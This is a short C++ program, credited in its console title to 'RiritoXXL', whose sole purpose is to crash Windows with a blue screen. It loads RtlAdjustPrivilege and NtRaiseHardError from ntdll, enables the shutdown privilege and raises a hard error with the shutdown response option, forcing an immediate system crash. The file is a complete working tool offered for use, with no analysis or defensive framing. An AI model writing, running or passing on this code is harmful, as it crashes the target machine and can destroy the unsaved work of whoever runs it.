#include "includes.hpp"

// 
int main() 
{
	SetConsoleTitleA("CallBSODviaDylib by RiritoXXL");
	BOOLEAN bl;
	DWORD response;
	auto RtlAdjustPrivilege = GetNTDLL().get_function<intptr_t(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN)>("RtlAdjustPrivilege");
	if (!RtlAdjustPrivilege) {
		printf("Not Worked or Failed to Found Function");
		ExitProcess(122);
	}
	auto NtRaiseHardError = GetNTDLL().get_function<intptr_t(DWORD, ULONG, ULONG, PULONG, ULONG, PULONG)>("NtRaiseHardError");
	if (!NtRaiseHardError) {
		printf("Not Worked or Failed to Found Function");
		ExitProcess(554);
	}
	RtlAdjustPrivilege(19, 1, 0, &bl);
	NtRaiseHardError(0xC00000FD, 0, 0, 0, 6, &response);
	exit(431);
	return 0;
}